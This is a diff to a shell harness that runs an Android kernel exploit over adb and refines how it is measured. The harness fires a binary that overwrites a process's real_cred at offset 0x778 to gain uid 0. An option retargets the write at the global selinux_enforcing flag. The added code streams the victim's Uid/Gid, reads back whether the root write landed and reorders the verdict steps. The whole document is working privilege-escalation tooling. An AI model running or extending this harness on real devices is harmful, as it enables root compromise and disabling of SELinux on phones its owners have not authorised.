@@ -55,12 +55,16 @@ CHAINWAIT=${CHAINWAIT:-6000}
 NODRAIN=${NODRAIN:-1}
 ROUNDS=${ROUNDS:-1}
 CONTROL=${CONTROL:-0}
+# EXTRA: appended verbatim to every shot's env.  Use it to change the WRITE
+# TARGET without touching anything else, e.g. EXTRA=V12_W7_MIMIC_W1=1 makes the
+# W7 chain write to the global selinux_enforcing instead of task+0x778.
+EXTRA=${EXTRA:-}
 # WATCH: seconds to watch for a reboot after the sequence.  15 by default; widen
 # it when the hypothesis under test predicts a DELAYED reboot.
-WATCH=${WATCH:-15}
+WATCH=${WATCH:-120}
 KLOG=$OUT/klog.host
 POLLPID=""
-mkdir -p "$OUT"
+mkdir -p "$OUT" || { echo "cannot create $OUT"; exit 1; }
 
 A() { "$ADB" -s "$SER" shell "$@"; }
 say() { echo "[$(date +%H:%M:%S)] $*"; }
@@ -146,6 +150,11 @@ else
     done
     [ "$W1OK" = 1 ] || { say "!! not Permissive — stopping"; exit 2; }
 fi
+# W1 runs the SAME pass machinery as W7 (exploit.c passW1 vs passW7) but the
+# runner passes it NO CHAINWAIT, so it uses the 20000 ms default.  Its evidence
+# is therefore the control for "chain completed + write landed": keep it.
+say "  W1 evidence:"
+A "cat $DEV/bootA_w1_ev_$TAG.txt 2>/dev/null" | tr -d '\r' | tee "$OUT/w1_evidence.txt" | sed 's/^/    /' | head -12
 
 # ---------------------------------------------------------------- 2. klog
 say "=== step 2: host-side kernel log (dmesg poll, deduped by timestamp) ==="
@@ -190,6 +199,22 @@ say "  task=$TASK child_pid=$CPID lt_parent=$PPID_LT"
 say "  baseline: $(uid_line "$CPID")"
 
 # ---------------------------------------------------------------- 5. shots
+# Continuous victim-status stream.  Started before the shots so that the readback
+# exists even if the box dies mid-sequence (run 10's landing was lost that way:
+# shot_until only read the status after the 45 s shot had returned).
+uid_trace_start() {   # $1=pid
+    [ -n "${TRACEPID:-}" ] && return 0
+    ( while :; do
+          printf '%s ' "$(date +%H:%M:%S)"
+          "$ADB" -s "$SER" shell "grep -m1 '^Uid:' /proc/$1/status; grep -m1 '^Gid:' /proc/$1/status" \
+              2>/dev/null | tr -d '\r' | tr '\n' ' '
+          echo
+          sleep 1
+      done ) >> "$OUT/uid.trace" 2>/dev/null &
+    TRACEPID=$!
+}
+uid_trace_stop() { [ -n "${TRACEPID:-}" ] && kill "$TRACEPID" 2>/dev/null; TRACEPID=""; }
+
 poll_uid() {   # $1=pid $2=timeout_s -> the first Uid line that is no longer 2000
     local pid=$1 t=$2 i u=""
     for i in $(seq 1 "$t"); do
@@ -212,7 +237,7 @@ shot() {
     say "  [$tag] ONE shot: off=$off chainwait=${CHAINWAIT}ms hold=${HOLD}s nodrain=$NODRAIN ${extra:-}"
     local t0 t1
     t0=$(date +%s)
-    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_W7_OFF=$off V12_CRED_VALUE_OFF=0 V12_CHAIN_WAIT_MS=$CHAINWAIT V12_HOLD_SEC=$HOLD V12_PIN_FORK=1 V12_NODRAIN=$NODRAIN $extra V12B_EVIDENCE=$ev ./$(basename "$BINW") W7 > $DEV/w7_${TAG}_$tag.log 2>&1 </dev/null &"
+    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_W7_OFF=$off V12_CRED_VALUE_OFF=0 V12_CHAIN_WAIT_MS=$CHAINWAIT V12_HOLD_SEC=$HOLD V12_PIN_FORK=1 V12_NODRAIN=$NODRAIN $EXTRA $extra V12B_EVIDENCE=$ev ./$(basename "$BINW") W7 > $DEV/w7_${TAG}_$tag.log 2>&1 </dev/null &"
     local i out=""
     for i in $(seq 1 20); do
         sleep 1
@@ -234,6 +259,17 @@ shot() {
     #   `probe_state = D` + `Uid: 0 0 4294967176 0` + "*** 0x778 LANDED ***").
     #   Never trust its HIT/miss line here.
     SHOT_PS=$(sed -n 's/^probe_state *= *\([A-Z?]\).*/\1/p' "$OUT/w7_$tag.txt" | tail -1)
+    # Immediately read the victim: shot_until used to do this only AFTER the
+    # whole shot (including a 45 s adb evidence read), which is how run 10 lost
+    # the one line that would have settled three things at once.
+    SHOT_STATUS=$(uid_line "$CPID")
+    SHOT_WT=$(sed -n 's/.*write_target= *\(0x[0-9a-f]*\).*/\1/p' "$OUT/w7_$tag.txt" | tail -1)
+    say "  [$tag] victim readback NOW: [$SHOT_STATUS]"
+    if [ -n "$SHOT_WT" ] && [ "${off}" = "0x778" ]; then
+        hi=$(( SHOT_WT >> 32 & 0xffffffff )); lo=$(( SHOT_WT & 0xffffffff ))
+        say "  [$tag] if 0x778 LANDED the side effect puts write_target at cred+8, so"
+        say "  [$tag] /proc/status must read:  Uid: 0 0 $hi 0   and   Gid first field = $lo"
+    fi
     SHOT_CRED=$(printf '%s\n' "$out" | sed -n 's/.*write value = private cred page \(0x[0-9a-f]*\).*/\1/p' | tail -1)
     say "  [$tag] probe_state=$SHOT_PS  (D=landed, R=miss, S=blocked)"
     return 0
@@ -260,6 +296,8 @@ shot_until() {   # $1=off $2=extra $3=tag $4=rounds -> 0 if the readback moved
     return 1
 }
 
+say "  starting uid.trace on pid $CPID"
+uid_trace_start "$CPID"
 say "=== step 5: 0x778 shot(s) (real_cred) ==="
 if [ "$CONTROL" = "1" ]; then
     say "  ⚠ CONTROL: V12_ALLOW_INIT_CRED=1 — write_value = the init_cred image"
@@ -290,6 +328,14 @@ if [ -n "$CRED" ]; then
     say "  after repair: [$(uid_line "$CPID")]"
 fi
 
+say "=== step 8: poke LT parent (BEFORE the verdict, so its own report counts) ==="
+[ -n "$PPID_LT" ] && A "kill -USR1 $PPID_LT" 2>&1 | tr -d '\r'
+for i in $(seq 1 15); do
+    sleep 1
+    R=$(A "cat $RES 2>/dev/null" | tr -d '\r' | tail -1)
+    [ -n "$R" ] && { say "  child report: $R"; break; }
+done
+
 say "=== verdict ==="
 UREP=$(uid_line "$CPID")
 RPT=$(A "cat $RES 2>/dev/null | tail -1" | tr -d '\r')
@@ -300,14 +346,6 @@ case "$UREP$RPT" in
   *) say "  ✗ cred did not take in this boot.  Take a fresh boot; do not add rounds.";;
 esac
 
-say "=== step 8: poke LT parent ==="
-[ -n "$PPID_LT" ] && A "kill -USR1 $PPID_LT" 2>&1 | tr -d '\r'
-for i in $(seq 1 15); do
-    sleep 1
-    R=$(A "cat $RES 2>/dev/null" | tr -d '\r' | tail -1)
-    [ -n "$R" ] && { say "  child report: $R"; break; }
-done
-
 say "=== step 9: watch ${WATCH}s ==="
 for i in $(seq 5 5 "$WATCH"); do
     sleep 5
@@ -316,6 +354,7 @@ for i in $(seq 5 5 "$WATCH"); do
     say "  t+${i}s up=$UP services=$(svc_count)/5"
 done
 
+uid_trace_stop
 say "=== step 10: evidence ==="
 stop_klog
 say "  klog.host: $(wc -l < "$KLOG") lines, $(sort -u "$KLOG" 2>/dev/null | wc -l) unique"
